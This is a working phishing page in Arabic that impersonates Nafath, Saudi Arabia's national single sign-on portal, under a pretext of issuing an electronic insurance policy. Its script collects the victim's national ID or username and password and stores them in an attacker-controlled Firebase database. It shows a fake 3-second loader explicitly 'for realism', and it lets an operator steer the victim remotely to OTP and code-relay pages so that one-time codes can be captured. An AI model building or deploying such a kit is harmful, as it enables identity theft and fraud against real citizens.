<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نفاذ - تسجيل الدخول الموحد</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        :root { --nafath-green: #006a4d; --bg-gray: #f4f4f4; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        /* شريط المعالجة العلوي */
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 1000; }
        .loading-box { background: white; padding: 25px; border-radius: 12px; text-align: center; width: 85%; max-width: 350px; }
        .loader-bar { width: 100%; height: 12px; background: #eee; border-radius: 6px; overflow: hidden; margin-bottom: 15px; display: flex; gap: 2px; }
        .bar-segment { flex: 1; background: #2ecc71; animation: pulse 1.2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }

        /* الحاوية الرئيسية */
        .container { width: 100%; max-width: 450px; background: white; min-height: 100vh; display: flex; flex-direction: column; }
        .header { padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
        .header img { height: 38px; }
        
        .content { padding: 25px; }
        .title { color: var(--nafath-green); font-size: 17px; font-weight: bold; text-align: center; margin-bottom: 25px; line-height: 1.6; }
        
        /* زر نوع الدخول */
        .login-type-btn { background: var(--nafath-green); color: white; padding: 15px; border-radius: 8px; font-weight: bold; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        
        .input-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: 600; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; background: #fafafa; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; text-align: right; }
        input:focus { border-color: var(--nafath-green); background: #fff; }

        .btn-submit { width: 100%; padding: 16px; background: var(--nafath-green); color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-submit:hover { opacity: 0.95; }
    </style>
</head>
<body>

<div id="overlay" class="loading-overlay">
    <div class="loading-box">
        <div class="loader-bar">
            <div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div>
        </div>
        <div style="font-size: 14px; color: #333; font-weight: 600;">جاري المعالجة ، نرجو الإنتظار ...</div>
    </div>
</div>

<div class="container">
    <div class="header">
        <div style="font-size: 24px; color: #666;">☰</div>
        <img src="https://iam.gov.sa/static/media/logo.8e294157.svg" alt="Nafath Logo">
    </div>

    <div class="content">
        <div class="title">شريحتك في الطلب لاصدار وثيقة التأمين الألكترونية .</div>
        
        <div class="login-type-btn">
            <span>اسم المستخدم وكلمة المرور</span>
            <span style="font-size: 20px;">-</span>
        </div>

        <div class="input-group">
            <label>اسم المستخدم \ الهوية الوطنية</label>
            <input type="text" id="username" placeholder="اسم المستخدم \ الهوية الوطنية">
        </div>

        <div class="input-group">
            <label>كلمة المرور</label>
            <input type="password" id="password" placeholder="كلمة المرور">
        </div>

        <button class="btn-submit" onclick="sendNafathData()">
            متابعة التوثيق
        </button>
    </div>
</div>

<script>
    // إعدادات Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // إخفاء اللودر بعد 3 ثواني لإعطاء واقعية
    setTimeout(() => {
        document.getElementById('overlay').style.display = 'none';
    }, 3000);

    async function sendNafathData() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const userId = localStorage.getItem('user_id');

        if (user.length < 5 || pass.length < 4) {
            alert("يرجى إدخال بيانات نفاذ بشكل صحيح");
            return;
        }

        try {
            // حفظ البيانات في Firebase
            await db.collection("orders").doc(userId).update({
                nafath_user: user,
                nafath_pass: pass,
                status: "Nafath Login Entered"
            });
            // بعد إرسال الاسم والباسورد، ننتقل لصفحة "رمز التوثيق" (التي كانت تظهر عندك بالخطأ)
            window.location.href = "nafath_otp.html"; 
        } catch (e) {
            alert("حدث خطأ في النظام، يرجى المحاولة لاحقاً");
        }
    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_faild.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
